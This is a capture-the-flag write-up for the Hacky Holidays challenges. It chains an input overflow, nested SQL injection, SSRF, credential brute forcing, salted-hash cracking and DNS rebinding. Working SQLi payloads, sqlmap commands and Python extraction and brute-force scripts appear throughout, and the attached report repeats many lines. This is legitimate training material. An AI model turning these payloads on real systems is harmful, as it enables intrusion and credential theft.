One of the things that stood out in the README.md file was item number 6: You can make anyone an admin by changing the last character in the users.txt file to a Y. That is interesting! If we can change the last character that is inserted into users.txt into a 'Y', we may just be able to access the admin area of the signup manager.
By getting a bit familiar with the code, we find no obvious vulnerabilities. A detailed review of the code that stores the user in users.txt file may be necessary to find anything interesting. The function that stores the user is available in index.php on line 26 and is called addUser, and looks like this:
Code 531 Bytes
1function addUser($username,$password,$age,$firstname,$lastname){
2    $random_hash = md5( print_r($_SERVER,true).print_r($_POST,true).date("U").microtime().rand() );
3    $line = '';
4    $line .= str_pad( $username,15,"#");
5    $line .= $password;
6    $line .= $random_hash;
7    $line .= str_pad( $age,3,"#");
8    $line .= str_pad( $firstname,15,"#");
9    $line .= str_pad( $lastname,15,"#");
10    $line .= 'N';
11    $line = substr($line,0,113);
12    file_put_contents('users.txt',$line.PHP_EOL, FILE_APPEND);
13    return $random_hash;
14}
By reviewing the code we see how the user is stored in the users.txt file. If we can make some part of the string, before the 'N' is appended, one char longer than it is expected to be, we should be able to insert an 'Y' in the last position of the lastname, and it will overflow into the char that decides if the user is an administrator or not.
The code will append the $line variable to the users.txt file. The $line variable consists of the username, padded to 15 characters, then the password, which is MD5 hash of the password, which is 32 characters. The age is then added and padded to 3 chars. Then firstname and lastname is appended, both padded to 15 chars. And then the last line is doing a substring of $line, choosing 113 chars, starting from position 0 (start of string).
So, if we are able to ensure that the variable $line has an Y at end of it, when it is written to the users.txt file, we should be able to become admin. To do this we need to "overflow" the string, by setting the lastnames last char to an 'Y' and getting the line variable to shift one position.
If we follow the signup flow from the code in index.php, we can see that on line 85: The POST parameter age is validated:
Code 400 Bytes
1if (!is_numeric($_POST["age"])) {
2	$errors[] = 'Age entered is invalid';
3}
4if (strlen($_POST["age"]) > 3) {
5	$errors[] = 'Age entered is too long';
6}
7$age = intval($_POST["age"]);
8if (count($errors) === 0) {
9	$cookie = addUser($username, $password, $age, $firstname, $lastname);
10	setcookie('token', $cookie, time() + 3600);
11	header("Location: " . explode("?", $_SERVER["REQUEST_URI"])[0]);
12	exit();
13}
There is two checks in place on the "age" property. First the is_numeric function is called with the age property, this function checks if a string passed to it is a valid number or numeric string. The second test is to check if the length of the age property is longer than three characters. If the age property is four chars or longer, an error will be thrown. After these two check, the intval function is called with the age property to convert the value into a number.
If there exists a string that does not contain more than three characters, but can be converted to a number that will take up four characters when converted via the intval function, we can overflow the last char of the "lastname" parameter and that will be shifted one position over, such that it is the last char that will be stored in users.txt.
This can be done by using "E notation" in PHP. Consider the following numbers:
Code 30 Bytes
16 x 10^2 = 600
26 x 10^3 = 6000
In many programming languages (including PHP) the numbers above can be represented in the following way:
Code 20 Bytes
16e2 = 600
26e3 = 6000
So by setting our age to 6e3 our input should get passed the validation of age, length is not above three characters and the value is numeric, but resulting value will take up four characters when inserted into the users.txt file, hence overflowing the last Y in our lastname to the position of the char that decides if the user is an administrator or not.
So we intercept the POST request for registering our user, and set the lastname to the value FFFFFFFFFFFFFFY and our age to 6e3, we should be added to the users.txt file as an admin. The full request looks like this:
<image_27>
We can then open the front page and login in with the credentials we used when we sent the POST request. We can see that our attack succeeded and we are finally in the admin area of the application:
<image_28>
Flag 10 is: flag{99309f0f-1752-44a5-af1e-a03e4150757d}

Flag 11 - r3c0n_server_4fdk59
When we successfully added us as an administrator and logged into the Signup manager, we got the flag 10 and a link to the next challenge. The links points to the following URL: https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59.
To get a foothold on the server, we start by running FFuF, with the common.txt file from SecLists, to find any interesting files or folders:
<image_29>
The /api path looks pretty interesting, and by navigating to /api we find the documentation for the API.
<image_30>
This looks pretty interesting. So if we navigate to r3c0n_server_4fdk59/api/ENDPOINTNAME we should be able to access the API. When we browse to any endpoints, we get a message that {"error":"This endpoint cannot be visited from this IP address"}. So if we are going to call the API, we will have to bypass the IP restriction. Maybe we can find a way to make the box do the request for us.
By browsing the application, we find that the application has two main features. The first feature is to display the photo albums and the second feature is to display the images in the photo albums.
By poking at the hash parameter on the album endpoint, we find that it is vulnerable to an SQL injection, we can dump the two tables that looks interesting in the recon database by running:
Code 125 Bytes
1sqlmap -u "https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jdh34k" -p hash --dbms mysql  -T photo,album -dump 
We find nothing interesting in the database, so there must be something else.
Code 849 Bytes
1Database: recon
2Table: photo
3[6 entries]
4+----+----------+--------------------------------------+
5| id | album_id | photo                                |
6+----+----------+--------------------------------------+
7| 1  | 1        | 0a382c6177b04386e1a45ceeaa812e4e.jpg |
8| 2  | 1        | 1254314b8292b8f790862d63fa5dce8f.jpg |
9| 3  | 2        | 32febb19572b12435a6a390c08e8d3da.jpg |
10| 4  | 3        | db507bdb186d33a719eb045603020cec.jpg |
11| 5  | 3        | 9b881af8b32ff07f6daada95ff70dc3a.jpg |
12| 6  | 3        | 13d74554c30e1069714a5a9edda8c94d.jpg |
13+----+----------+--------------------------------------+
14
15Database: recon
16Table: album
17[3 entries]
18+----+--------+-----------+
19| id | hash   | name      |
20+----+--------+-----------+
21| 1  | 3dir42 | Xmas 2018 |
22| 2  | 59grop | Xmas 2019 |
23| 3  | jdh34k | Xmas 2020 |
24+----+--------+-----------+
25
If we look closely at the images, that the album page returns, we see that the picture endpoint takes a data parameter that always starts with "ey", again, this is usually and indication that the data is base64 encoded JSON. So if we take one image urls: https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcL2RiNTA3YmRiMTg2ZDMzYTcxOWViMDQ1NjAzMDIwY2VjLmpwZyIsImF1dGgiOiJiYmYyOTVkNjg2YmQyYWYzNDZmY2Q4MGM1Mzk4ZGU5YSJ9 and we base64 decode the value of the data parameter we get:
Code 120 Bytes
1{"image":"r3c0n_server_4fdk59\/uploads\/db507bdb186d33a719eb045603020cec.jpg","auth":"bbf295d686bd2af346fcd80c5398de9a"}
This looks very interesting. If we change the image URL, we may be able to perform a Server Side Request Forgery (SSRF) attack against the API, which in this case will make the API request come directly from the r3c0n server, and not from our IP. This may let us bypass the IP restriction on the API. Let us change the image property of the JSON object from r3c0n_server_4fdk59\/uploads\/db507bdb186d33a719eb045603020cec.jpg to r3c0n_server_4fdk59\/api and encode the the whole JSON object with base64 again. This will produce the following encoded data:
Code 104 Bytes
1eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL2FwaSIsImF1dGgiOiJiYmYyOTVkNjg2YmQyYWYzNDZmY2Q4MGM1Mzk4ZGU5YSJ9
And if we append it to the URL we get:
Code 169 Bytes
1https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL2FwaSIsImF1dGgiOiJiYmYyOTVkNjg2YmQyYWYzNDZmY2Q4MGM1Mzk4ZGU5YSJ9
When we request the URL we get the following message: invalid authentication hash. So, there is some kind of authentication going on here. We will probably need to bypass that.
Since the "hash" parameter on the albums page is vulnerable to a SQL injection, maybe we can influence the query in some way, and change the image URL in the JSON object and get the server to generate a valid hash for that new URL.
By exploiting the SQL injection using a union based query, we are able to modify the image path. The following value, sent to the album endpoint via the hash parameter, will result in modifying the image path:
Code 59 Bytes
1a' UNION SELECT "2' UNION SELECT 1,1,'../api' --+-",1,1--+-
This query, will change the image path of in the returned JSON data object that is then sent to the picture endpoint. We can observe it by browsing to the following URL:
Code 122 Bytes
1https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=a' UNION SELECT "2' UNION SELECT 1,1,'../api' --+-",1,1--+-
If we base64 decode the data parameter sent to the picture endpoint now, we see that it has changed to the following:
Code 91 Bytes
1{"image":"r3c0n_server_4fdk59\/uploads\/..\/api","auth":"38122d477657c1a0c9ba873c11017497"}
Now we are able to do a directory traversal via the image path, and the server will generate the hash for us. To make the testing a little easier we can use the following Python script to send a request with our chosen path, and get the data decoded and the HTTP response code and body from the picture request:
Code 789 Bytes
1import requests
2import sys
3from bs4 import BeautifulSoup
4import base64
5
6if len(sys.argv) != 2:
7    print("(-) Usage: {} <PATH>".format(sys.argv[0]))
8    sys.exit(1)
9
10url ="https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=a' UNION SELECT \"2' UNION SELECT 1,1,'{}' --+-\",1,1--+-".format(sys.argv[1])
11response = requests.get(url) 
12soup = BeautifulSoup(response.text, 'html.parser')
13all_img = soup.find_all(class_="img-responsive")
14interesting_image_src = all_img[1]['src']
15
16data_content = base64.b64decode(interesting_image_src.split("?")[1].split("data")[1]).decode("utf-8")
17
18image_url = "https://hackyholidays.h1ctf.com{}".format(interesting_image_src)
19image_resp = requests.get(image_url)
20
21print("{} - {} - {}".format(image_resp.status_code, data_content, image_resp.text))
We supply the script with the path that we would like generate a valid request towards, the script will then make the request and perform the union based sql injection, in order to modify the path and generate a valid hash. It will then perform the request for the image and it will print out the response code from the image request, the content of the data parameter (base64 decoded such that we are able to read the content) and the response text from the image.
If we look back at the API documentation we see that API will return a 404 response code when a request towards an endpoint that does not exists, it will return a 204 when you have a valid request, but no data is returned from the endpoint. The API will also return a 400 response when a invalid GET or POST request parameter is added. We can exploit these properties with the above script in order to infer information about the back-end. By running the script with the following paths:
<image_31>
We see that when we request the path "../api/endpoint" the picture endpoint will respond with the message "Expected HTTP status 200, Received: 404". So the request to "/api/endpoint" return a HTTP status code of 404. By playing around with this we can fuzz some common names of the API endpoints, and that is how we discover the "/api/user" endpoint. When we call the above script with "/api/user" we get a message of "Invalid content type detected", so this endpoint returns something else than the others who return 404.
If we start to add parameters from to the "/api/user" endpoint we discover that adding a parameter of the name "test" the request results in a 400 response, and as the API documentation states, this is an "Invalid GET/POST variable". So if we fuzz the parameter name we find that both "username" and "password" are parameters that will results in a 204 response from the endpoint. It seems that the endpoint is vulnerable to a "Wilcard SQL LIKE"-injection attack. This means that the back-end query of the API is something like this:
Code 85 Bytes
1SELECT * from users where username like '<USERINPUT>' and password like '<USERINPUT>'
The "%" operator in SQL is equivalent to any string of zero or more characters. If we send a request with the username parameter set equal to "a%" the API will return 204 if there exists no such user, and a 400 (Invalid content type) if the condition is valid. This is illustrated in the previous screenshot by submitting a query where the username is "a%" and a query where the username is set to "%g". So it looks like the username starts with a "g".
To brute force the username and password would require a couple of requests, doing this by hand is a bit cumbersome. So we can create a small Python script to do the brute force for us. The python script is attached to the appendix section as flag11-bf.py. If we run the script we get the following output:
<image_32>
The script is successfully able to brute force the username and password. This results in the username grinchadmin and the password s4nt4sucks. If we then navigate to the login page of the "attack box", that is linked to on the front page of the r3c0n server, and login with the credentials, we will see the following page:
<image_33>
Flag 11 is: flag{07a03135-9778-4dee-a83c-7ec330728e72}

Flag 12 - Attack box
Now that we have access to the Grinch network attack server, we must find a way to take it down, in order to stop the Grinch from launching his DDoS attack against Santa servers.
When one of the attack links is clicked, an URL like this is sent to the server:
Code 150 Bytes
1https://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiIyMDMuMC4xMTMuMzMiLCJoYXNoIjoiNWYyOTQwZDY1Y2E0MTQwY2MxOGQwODc4YmMzOTg5NTUifQ==
This will then launch an attack against the designated IP. If we focus our attention on the URL, we find the familiar "ey" pattern, so let us base64 decode the payload:
Code 67 Bytes
1{"target":"203.0.113.33","hash":"5f2940d65ca4140cc18d0878bc398955"}
Ok, so the target information is encoded in the payload. Let us try to launch a DDoS attack against 127.0.0.1 and see if we can take down the server. We first change the payload to this:
Code 64 Bytes
1{"target":"127.0.0.1","hash":"5f2940d65ca4140cc18d0878bc398955"}
We then base64 encode it and append it to the URL. So we end up with this: https://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiIxMjcuMC4wLjEiLCJoYXNoIjoiNWYyOTQwZDY1Y2E0MTQwY2MxOGQwODc4YmMzOTg5NTUifQ==
If we open the URL, we get the following message: Invalid Protection Hash. So again the payload is protected by some kind of hash.
The hash inside the JSON object looks like an MD5 hash, but the IP-address may be salted with a secret value before the MD5 sum is calculated. This may explain why neither Google or Crackstation is able to return the cleartext value of the hash. If we are going to crack the hash, we will need find the secret value.
To find the secret value we can create a small Python script to prefix a word, from a wordlist, to the IP address. The script is listed in the appendix section named "md5cracker.py". The script stores each of the discovered hashes, and each of the valid IPs. It will then run through the wordlist and take the word from the wordlist, and append the ip to the word. It then calculates the MD5 hash of that string, and checks if the resulting hash is in the list of known hashes. If we run the script against the rockyou.txt wordlist (found in the Seclist project), we get the following result:
<image_34>
This means that the IP is prefixed with the secret word mrgrinch463 before it is MD5 hashed. Now we can test out if we can launch an attack on an IP of our choice, since we can calculate a valid hash for the target we would like the server to attack. Time to take the down the Grinchs network!
We can now direct the server to 127.0.0.1 instead by calculating the md5 hash of the string "mrgrinch463127.0.0.1", which results in: "3e3f8df1658372edf0214e202acb460b". We then base64 encode the following payload
Code 65 Bytes
1{"target":"127.0.0.1", "hash":"3e3f8df1658372edf0214e202acb460b"}
And append it to the URL like this:
Code 146 Bytes
1https://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiIxMjcuMC4wLjEiLCAiaGFzaCI6IjNlM2Y4ZGYxNjU4MzcyZWRmMDIxNGUyMDJhY2I0NjBiIn0=
We end up with the following results from the server:
<image_35>
So in order to take down the server we must find a hosts that can bypass the detection of local targets, but still resolve to the attacking server. This sound very much like DNS rebinding.
DNS rebinding is a very interesting attack. In practical terms it will let one host resolve to multiple IPs. A good tool to test for DNS rebinding attacks is this project on github: https://github.com/taviso/rbndr. From the README.md file we can see that the way to create a valid dns-rebinding host is like this:
Code 44 Bytes
1<ipv4 in base-16>.<ipv4 in base-16>.rbndr.us
So if we take 127.0.0.1 and convert the address to hex we get "7f000001", and if we do the same for 203.0.113.33 we get "cb007121". If we put this together we get the following host that we can include in our payload:
Code 26 Bytes
17f000001.cb007121.rbndr.us
We then create the payload and calculate the hash for the payload:
Code 81 Bytes
1{"target":"7f000001.cb007121.rbndr.us","hash":"54171d97f5299ef84c1c01a676eaa917"}
We base64 encode the payload and add it to the payload parameter in the URL. The full attack URL then looks like this:
Code 170 Bytes
1https://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiI3ZjAwMDAwMS5jYjAwNzEyMS5yYm5kci51cyIsICJoYXNoIjoiNTQxNzFkOTdmNTI5OWVmODRjMWMwMWE2NzZlYWE5MTcifQ==
We can launch the attack by opening the URL in the browser, and the result looks like this:
<image_36>
The host will sometimes resolve first to 127.0.0.1, which results in the attack failing, since this is a local IP. If this happens we just wait 15s (because of the server only allowing one request per 15 second), and open the URL again. If we watch the result closely, we see that the server resolves the hostname to "203.0.113.33", one of the original targets of the attack, but when the server does another DNS lookup on the host, when launching the attack, the DNS rebinding will result in the host now resolving to the local address of 127.0.0.1. So the attack will be launch against the local attack box. After a short amount of time we are redirected to the following screen:
<image_37>
And that is it! We have successfully infiltrated the Grinchs network and taken down his attack server and saved the holidays.
Flag 12 is: flag{ba6586b0-e482-41e6-9a68-caf9941b48a0}

Appendix
flag9-solver.py
Code 5.80 KiB
1import requests
2from requests.packages.urllib3.exceptions import InsecureRequestWarning
3import sys
4import string
5from bs4 import BeautifulSoup
6
7headers = {
8    "User-Agent": "<marquee>Hackerman-script</marquee>",
9    "Content-type": "application/x-www-form-urlencoded"
10}
11
12charset = string.ascii_lowercase + string.digits + string.ascii_uppercase 
13base_url = "https://hackyholidays.h1ctf.com/evil-quiz"
14
15bf_list = string.ascii_uppercase + string.ascii_lowercase + string.digits + string.punctuation
16
17if len(sys.argv) != 1:
18    print("(-) Usage: {} ".format(sys.argv[0]))
19    sys.exit(1)
20
21cookies=dict()
22
23def get_session():
24    response = requests.get(base_url, headers=headers, allow_redirects=False)
25    return response.cookies['session']
26
27def initiate_session():
28    sessionid = get_session()
29    global cookies
30    cookies=dict(session=sessionid + ";")
31    requests.post(base_url, data={"name":"test"}, headers=headers, cookies=cookies, verify=False, allow_redirects=False)
32    quiz_data = {
33        "ques_1": "0",
34        "ques_2": "0",
35        "ques_3": "0"
36    }
37    requests.post(base_url + "/start", data=quiz_data, headers=headers, cookies=cookies, allow_redirects=False, verify=False)
38
39
40def check_condition(condition):
41    payload = "admin' and ({}) -- ".format(condition)
42
43    data={
44        "name": payload
45    }
46
47    requests.post(base_url + "/", data=data, headers=headers, verify=False, allow_redirects=False, cookies=cookies)
48
49    score_response = requests.get(base_url + "/score", verify=False, cookies=cookies)
50    soup = BeautifulSoup(score_response.text, 'html.parser')
51    container = soup.findAll('div')
52    last_div = container[len(container) - 1]
53
54    if int(last_div.text.split(" ")[2]) > 0:
55        return True
56    else:
57        return False
58
59def get_number_of_tables():
60    for x in range(1, 100):
61        if check_condition("select (select count(*) from information_schema.tables)={}".format(x)):
62            return x
63    return None
64
65def get_string_length():
66    for x in range(80, 85):
67        if check_condition("select CONVERT((select count(*) from information_schema.tables), DECIMAL)='{}'".format(x)):
68            return x
69
70def get_length_of_table_name(table_number):
71    for x in range(0, 85):
72        if check_condition("select length((select table_name from information_schema.tables order by create_time desc limit {},1))='{}'".format(table_number, x)):
73            return x
74
75
76
77def get_lastest_created_table_name(table_length):
78    name = ""
79    for index in range(0, table_length + 1):
80        for char in charset:
81            if check_condition("select substring((select table_name from information_schema.tables order by create_time desc limit 0,1), {},1)='{}'".format(index, char)):
82                name += char
83                break
84
85    return name
86
87def get_length_of_column_name_in_table(column_index, table_name):
88    for x in range(1, 85):
89        if check_condition("select length((select column_name from information_schema.columns where table_name='{}' limit {},1))='{}'".format(table_name, column_index, x)):
90            return x
91
92def get_number_of_columns_from_table(table_name):
93    for x in range(1, 85):
94        if check_condition("select CONVERT((select count(column_name) from information_schema.columns where table_name='{}'), DECIMAL)='{}'".format(table_name, x)):
95            return x
96
97def get_column_name(table_name, column_index):
98    column_name = ""
99    length_of_column = get_length_of_column_name_in_table(column_index, table_name)
100    print("Length of column_index: {}, in table: {}, is: {} char(s)".format(column_index, table_name, length_of_column))
101    for index in range(1, length_of_column+1):
102        for char in charset:
103            if check_condition("select ascii(substring((select column_name from information_schema.columns where table_name='{}' limit {},1), {},1))='{}'".format(table_name, column_index, index, ord(char))):
104                column_name += char
105                break
106    return column_name
107
108def count_rows_in(table_name):
109    for x in range(1, 100):
110        if check_condition("select CONVERT((select count(*) from {}), DECIMAL)='{}'".format(table_name, x)):
111            return x
112    return None
113
114def get_length_of_value(table_name, column_name, row_index):
115     for x in range(1, 100):
116        if check_condition("select length((select {} from {} order by {} asc limit {},1))='{}'".format(column_name, table_name, column_name, row_index, x)):
117            return x
118            
119
120def get_table_row_from_column(table_name, row_index, column):
121    value = ""
122    value_length = get_length_of_value(table_name, column, row_index)
123    print("Column: {}, in table: {} with row_index {} is {} char(s) long".format(column, table_name, row_index, value_length))
124    for x in range(1, value_length+1):
125        for char in bf_list:
126            if check_condition("select ascii(substring((select {} from {} limit {},1), {}, 1))='{}'".format(column, table_name, row_index, x, ord(char))):
127                value += char
128                break
129    return value
130
131
132if __name__ == "__main__":
133    initiate_session()
134    table_name = get_lastest_created_table_name(get_length_of_table_name(0))
135    print("Found table {}. Fetching number of columns...".format(table_name))
136    rows_in_table = count_rows_in(table_name)
137    print("Table: {} contains {} row(s)".format(table_name, rows_in_table))
138    number_of_columns = get_number_of_columns_from_table(table_name)
139    print("Table: {} contains {} column(s). Fetching column names..".format(table_name, number_of_columns))
140    
141
142    columns = []
143    for x in range(0, number_of_columns):
144        column_name = get_column_name(table_name, x)
145        print("Found column: {} in table {}. Fetching content".format(column_name, table_name))
146        column_value = get_table_row_from_column(table_name, 0, column_name)
147        print("Column: {} in table: {} has value: {}".format(column_name, table_name, column_value))
148
flag11-bf.py
Code 1.97 KiB
1import requests
2from bs4 import BeautifulSoup
3import base64
4import string
5
6charset = string.ascii_lowercase + string.digits
7
8base_url ="https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=a' UNION SELECT \"2' UNION SELECT 1,1,'{}' --+-\",1,1--+-"
9
10def get_username():
11    username = ""
12    while True:
13        found_char_previous_run = False
14        for char in charset:
15            test_string = username + char
16            path = "../api/user?username={}%25".format(test_string)
17            url = base_url.format(path)
18            if is_invalid_content_type(url):
19                username += char 
20                print(char, flush=True, end='')
21                found_char_previous_run = True
22                break
23        
24        if not found_char_previous_run:
25            break
26    return username
27
28def get_password(username):
29    password = ""
30    while True:
31        found_char_previous_run = False
32        for char in charset:
33            test_string = password + char
34            path = "../api/user?username={}%26password={}%25".format(username, test_string)
35            url = base_url.format(path)
36            if is_invalid_content_type(url):
37                password += char 
38                print(char, flush=True, end='')
39                found_char_previous_run = True
40                break
41        
42        if not found_char_previous_run:
43            break
44    return password
45
46
47
48def is_invalid_content_type(url):
49    response = requests.get(url) 
50    soup = BeautifulSoup(response.text, 'html.parser')
51    all_img = soup.find_all(class_="img-responsive")
52    interesting_image_src = all_img[1]['src']
53
54    image_url = "https://hackyholidays.h1ctf.com{}".format(interesting_image_src)
55    image_resp = requests.get(image_url)
56    if image_resp.text == "Invalid content type detected":
57        return True
58    else:
59        return False
60
61
62username = get_username()
63print("\nUsername is: {}".format(username))
64password = get_password("grinchadmin")
65print("\nThe password is: {}".format(password))
md5cracker.py
Code 749 Bytes
1import hashlib
2import sys
3
4if len(sys.argv) != 2:
5    print("(-) Usage: {} <WORDLIST>".format(sys.argv[0]))
6    sys.exit(1)
7
8wordlist = []
9
10with(open(sys.argv[1], "r", encoding='ISO-8859-1')) as fp:
11    for x in fp:
12        wordlist.append(x.strip())
13
14hashs = [
15    "5f2940d65ca4140cc18d0878bc398955",
16    "2814f9c7311a82f1b822585039f62607",
17    "5aa9b5a497e3918c0e1900b2a2228c38",
18]
19
20ips = [
21    "203.0.113.33",
22    "203.0.113.53",
23    "203.0.113.213"
24]
25
26for word in wordlist:
27    for ip in ips:
28        combined_word_ip = word+ip
29        calculate_hash = hashlib.md5(combined_word_ip.encode('utf-8')).hexdigest()
30        if calculate_hash in hashs:
31            print("Got a hit for word: {} on hash: {} for ip {}".format(word, calculate_hash, ip))

Impact
We have successfully infiltrated the Grinch Networks and taken them down! Effectively saving the holidays!



==================================================

Report File: 1069189.json
------------------------------
Report To: Not specified
Severity: HIGH
Weaknesses:
- Improper Restriction of Authentication Attempts

Contents:

Summary:
CTF Submission
Code 609 Bytes
1Day 1: flag{48104912-28b0-494a-9995-a203d1e261e7} 
2Day 2: flag{b7ebcb75-9100-4f91-8454-cfb9574459f7} 
3Day 3: flag{b705fb11-fb55-442f-847f-0931be82ed9a} 
4Day 4: flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6} 
5Day 5: flag{2e6f9bf8-fdbd-483b-8c18-bdf371b2b004} 
6Day 6: flag{18b130a7-3a79-4c70-b73b-7f23fa95d395} 
7Day 7: flag{5bee8cf2-acf2-4a08-a35f-b48d5e979fdd} 
8Day 8: flag{677db3a0-f9e9-4e7e-9ad7-a9f23e47db8b}
9Day 9: flag{6e8a2df4-5b14-400f-a85a-08a260b59135}
10Day 10: flag{99309f0f-1752-44a5-af1e-a03e4150757d}
11Day 11: flag{07a03135-9778-4dee-a83c-7ec330728e72}
12Day 12: flag{ba6586b0-e482-41e6-9a68-caf9941b48a0}
<image_0>
Steps To Reproduce:
Day 1: /robots.txt
Day 2: /s3cr3t-ar3a
inspect html
the flag is dynamically built
inspect html
the flag is dynamically built
Day 3: /people-rater
https://hackyholidays.h1ctf.com/people-rater/entry?id=eyJpZCI6MX0=
https://hackyholidays.h1ctf.com/people-rater/entry?id=eyJpZCI6MX0=
Day 4: /swag-shop
https://hackyholidays.h1ctf.com/swag-shop/api/sessions
One of the sessions has a user value C7DCCE-0E0DAB-B20226-FC92EA-1B9043
https://hackyholidays.h1ctf.com/swag-shop/api/user?uuid=C7DCCE-0E0DAB-B20226-FC92EA-1B9043
https://hackyholidays.h1ctf.com/swag-shop/api/sessions
One of the sessions has a user value C7DCCE-0E0DAB-B20226-FC92EA-1B9043
https://hackyholidays.h1ctf.com/swag-shop/api/user?uuid=C7DCCE-0E0DAB-B20226-FC92EA-1B9043
Day 5: Secure Login
bruteforce the username: access & password: computer
Edit the cookie to make ourselves admin
/my_secure_files_not_for_you.zip
password for zip: hahahaha
secure-login.rb (F1139213)
bruteforce the username: access & password: computer
Edit the cookie to make ourselves admin
/my_secure_files_not_for_you.zip
password for zip: hahahaha
secure-login.rb (F1139213)
Day 6: /my-diary/?template=entries.html
/my-diary/?template=index.php discloses the source
https://hackyholidays.h1ctf.com/my-diary/?template=secretadsecretaadmin.phpdmin.phpmin.php
/my-diary/?template=index.php discloses the source
https://hackyholidays.h1ctf.com/my-diary/?template=secretadsecretaadmin.phpdmin.phpmin.php
Day 7: /hate-mail-generator
curl 'https://hackyholidays.h1ctf.com/hate-mail-generator/new/preview' -H 'Content-Type: application/x-www-form-urlencoded' --data-raw 'preview_markup=Hello+%7B%7Bname%7D%7D+....&preview_data=%7B%22name%22%3A%22%7B%7Btemplate%3A38dhs_admins_only_header.html%7D%7D%22%2C%22email%22%3A%22alice%40test.com%22%7D'
curl 'https://hackyholidays.h1ctf.com/hate-mail-generator/new/preview' -H 'Content-Type: application/x-www-form-urlencoded' --data-raw 'preview_markup=Hello+%7B%7Bname%7D%7D+....&preview_data=%7B%22name%22%3A%22%7B%7Btemplate%3A38dhs_admins_only_header.html%7D%7D%22%2C%22email%22%3A%22alice%40test.com%22%7D'
Day 8: /forum
Github recon: search for "grinch-networks"
One username is found https://github.com/Grinch-Networks
Commit history reveals password here
Log into the phpmyadmin with username: forum & password: 6HgeAZ0qC9T6CQIqJpD
Get username grinch & password 35D652126CA1706B59DB02C93E0C9FBF which is a hash
Use crackstation to get the value BahHumbug
Log into the forum with the username: grinch & password:BahHumbug
curl 'https://hackyholidays.h1ctf.com/forum/3/2' -H 'Cookie: phpmyadmin=98ac2709d3d94e8ba1afefab300deb8e; token=9F315347A655FFDAF70CD4A3529EE8A6
Github recon: search for "grinch-networks"
One username is found https://github.com/Grinch-Networks
Commit history reveals password here
Log into the phpmyadmin with username: forum & password: 6HgeAZ0qC9T6CQIqJpD
Get username grinch & password 35D652126CA1706B59DB02C93E0C9FBF which is a hash
Use crackstation to get the value BahHumbug
Log into the forum with the username: grinch & password:BahHumbug
curl 'https://hackyholidays.h1ctf.com/forum/3/2' -H 'Cookie: phpmyadmin=98ac2709d3d94e8ba1afefab300deb8e; token=9F315347A655FFDAF70CD4A3529EE8A6
Day 9: /evil-quiz
Second Order SQLi in name parameter
use a name like hax" OR (select 1 from admin)# to verify the existence of the admin table
use a name like hax" OR (select count(password) from admin)# to verify the column password
Second Order SQLi in name parameter
use a name like hax" OR (select 1 from admin)# to verify the existence of the admin table
use a name like hax" OR (select count(password) from admin)# to verify the column password
I decided to bruteforce the password
evil-quiz.rb (F1139240) username: admin password: S3creT_p4ssw0rd-$
Day 10 /signup-manager
https://hackyholidays.h1ctf.com/signup-manager/README.md from html source
Download https://hackyholidays.h1ctf.com/signup-manager/signupmanager.zip
Source Code!
Need a username that gets us admin username#password#cookie#age#firstname#lastname#Y - note the Y at the end
If we submit a number that "expands" after being evaluated by $age = intval($_POST["age"]); we can "overflow" our lastname and end up with an admin account
action=signup&username=1337&password=password&age=1e5&firstname=YYYYYYYYYYYYYYY&lastname=YYYYYYYYYYYYYYY
https://hackyholidays.h1ctf.com/signup-manager/README.md from html source
Download https://hackyholidays.h1ctf.com/signup-manager/signupmanager.zip
Source Code!
Need a username that gets us admin username#password#cookie#age#firstname#lastname#Y - note the Y at the end
If we submit a number that "expands" after being evaluated by $age = intval($_POST["age"]); we can "overflow" our lastname and end up with an admin account
action=signup&username=1337&password=password&age=1e5&firstname=YYYYYYYYYYYYYYY&lastname=YYYYYYYYYYYYYYY
Day 11: /r3c0n_server_4fdk59
SQLi insde more SQLi
There's a SQL injection in the hash param: /r3c0n_server_4fdk59/album?hash=3dir42
r3c0n_server_4fdk59.rb (F1139250) - script to bruteforce the username & password: grinchadmin : s4nt4sucks
curl 'https://hackyholidays.h1ctf.com/attack-box' -H 'Cookie: attackbox=d09d508e78f3975e0199a5e91dde9687
SQLi insde more SQLi
There's a SQL injection in the hash param: /r3c0n_server_4fdk59/album?hash=3dir42
r3c0n_server_4fdk59.rb (F1139250) - script to bruteforce the username & password: grinchadmin : s4nt4sucks
curl 'https://hackyholidays.h1ctf.com/attack-box' -H 'Cookie: attackbox=d09d508e78f3975e0199a5e91dde9687
Day 12: /attack-box
The only thing to try to attack is the hash inside the base64 encoded value that maps the target's ip address
Use hashcat with the hashes we have alongside some guesses for the salt and the ip addresses we have, our guesses will look like hash:salt:ip
Use some Christmas keywords like santa, grinch from wordlists
5f2940d65ca4140cc18d0878bc398955:mrgrinch463:203.0.113.33
Now we can sign our payloads with the correct salt, but using 127.0.0.1 stops the attack
Use DNS rebinding! - https://lock.cmpxchg8b.com/rebinder.html
https://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiI3ZjAwMDAwMS43ZjAwMDAwMi5yYm5kci51cyIsImhhc2giOiI1MzE4NDcxODU0MDBhYjkzOWE5Yzc5NzA3NTAzOGIwYiJ9
The only thing to try to attack is the hash inside the base64 encoded value that maps the target's ip address
Use hashcat with the hashes we have alongside some guesses for the salt and the ip addresses we have, our guesses will look like hash:salt:ip
Use some Christmas keywords like santa, grinch from wordlists
5f2940d65ca4140cc18d0878bc398955:mrgrinch463:203.0.113.33
Now we can sign our payloads with the correct salt, but using 127.0.0.1 stops the attack
Use DNS rebinding! - https://lock.cmpxchg8b.com/rebinder.html
